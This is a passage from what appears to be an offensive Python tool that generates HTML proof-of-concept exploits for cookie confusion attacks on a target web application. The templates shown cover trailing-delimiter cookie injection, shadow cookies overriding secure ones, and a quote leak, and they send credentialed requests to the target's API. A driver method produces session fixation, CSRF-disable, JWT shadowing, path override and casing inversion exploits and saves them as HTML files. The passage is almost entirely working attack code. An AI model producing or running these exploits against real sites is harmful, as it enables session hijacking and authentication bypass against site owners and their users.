    <button onclick="testQuoteLeak()">Test Quote Leak</button>
    
    <div id="result">Results will appear here...</div>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        elif exploit_type == "delimiter_exploit":
            trailing_delimiters = args[0] if args else ";;;"

            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Trailing Delimiter PoC</title>
</head>
<body>
    <h1>Cookie Confusion: Trailing Delimiter Exploit</h1>
    <script>
    // Set the cookie with trailing delimiters
    document.cookie = "{cookie_name}={cookie_value}{trailing_delimiters}; path=/";
    
    // Test the endpoint
    async function testDelimiterExploit() {{
        const response = await fetch('{self.target}/api/validate', {{
            method: 'GET',
            credentials: 'include'
        }});
        
        const result = await response.text();
        document.getElementById('result').innerText = result;
    }}
    </script>
    
    <button onclick="testDelimiterExploit()">Test Delimiter Exploit</button>
    
    <div id="result">Results will appear here...</div>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        elif exploit_type == "shadow_cookie":
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Shadow Cookie PoC</title>
</head>
<body>
    <h1>Cookie Confusion: Shadow Cookie Attack</h1>
    <script>
    // Simulate secure cookie (would be set by the server)
    // document.cookie = "{cookie_name}=secure_value; Secure; HttpOnly; SameSite=Strict; path=/";
    
    // Set shadow cookie
    document.cookie = "{cookie_name}={cookie_value}; path=/";
    
    // Make a request to test
    async function testShadowCookie() {{
        const response = await fetch('{self.target}/api/user', {{
            method: 'GET',
            credentials: 'include'
        }});
        
        const result = await response.text();
        document.getElementById('result').innerText = result;
    }}
    </script>
    
    <p>Note: Visit a secure page on the target site first to establish the secure cookie.</p>
    
    <button onclick="testShadowCookie()">Test Shadow Cookie</button>
    
    <div id="result">Results will appear here...</div>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies (HttpOnly cookies won't show up)
    document.getElementById('cookies').innerText = "Visible cookies: " + document.cookie;
    </script>
</body>
</html>
"""

        else:
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Generic Cookie Exploit PoC</title>
</head>
<body>
    <h1>Cookie Confusion: Exploit Proof of Concept</h1>
    <script>
    // Set the cookie
    document.cookie = "{cookie_name}={cookie_value}; path=/";
    </script>
    
    <p>Cookie has been set. Check the console for details.</p>
    
    <div id="cookies"></div>
    
    <script>
    // Display the cookies
    document.getElementById('cookies').innerText = "Current cookies: " + document.cookie;
    
    // Log cookies
    console.log("Cookies:", document.cookie);
    </script>
</body>
</html>
"""

    def generate_all_exploits(self) -> Dict[str, Any]:
        """
        Generate all applicable exploits.

        Returns:
            Dict[str, Any]: Dictionary of generated exploits
        """
        logger.info(
            f"Generating exploits for {len(self.applicable_exploits)} applicable exploit types"
        )

        for exploit_type in self.applicable_exploits:
            logger.info(f"Generating {exploit_type} exploit")

            if exploit_type == "session_fixation":
                exploit = self.generate_session_fixation_exploit()
            elif exploit_type == "csrf_disable":
                exploit = self.generate_csrf_disable_exploit()
            elif exploit_type == "jwt_shadowing":
                exploit = self.generate_jwt_shadowing_exploit()
            elif exploit_type == "path_override":
                exploit = self.generate_path_override_exploit()
            elif exploit_type == "casing_inversion":
                exploit = self.generate_casing_inversion_exploit()
            elif exploit_type == "quote_leak":
                exploit = self.generate_quote_leak_exploit()
            elif exploit_type == "delimiter_exploit":
                exploit = self.generate_delimiter_exploit()
            elif exploit_type == "shadow_cookie":
                exploit = self.generate_shadow_cookie_exploit()
            else:
                logger.warning(f"Unknown exploit type: {exploit_type}")
                continue

            self.results["exploits"][exploit_type] = exploit

        # Save results
        filename = f"{self.output_dir}/bypassgen_{self.hostname}_{int(time.time())}.json"
        save_results(self.results, filename)

        # Create individual HTML files for each exploit
        html_dir = os.path.join(self.output_dir, "html_exploits")
        os.makedirs(html_dir, exist_ok=True)

        for exploit_type, exploit in self.results["exploits"].items():
            if exploit.get("status") == "generated" and "poc_html" in exploit:
                html_path = os.path.join(html_dir, f"{exploit_type}_{self.hostname}.html")

                with open(html_path, "w") as f:
                    f.write(exploit["poc_html"])

                logger.info(f"Saved HTML PoC for {exploit_type} to {html_path}")

        logger.info(f"All exploits generated. Results saved to {filename}")
        return self.results
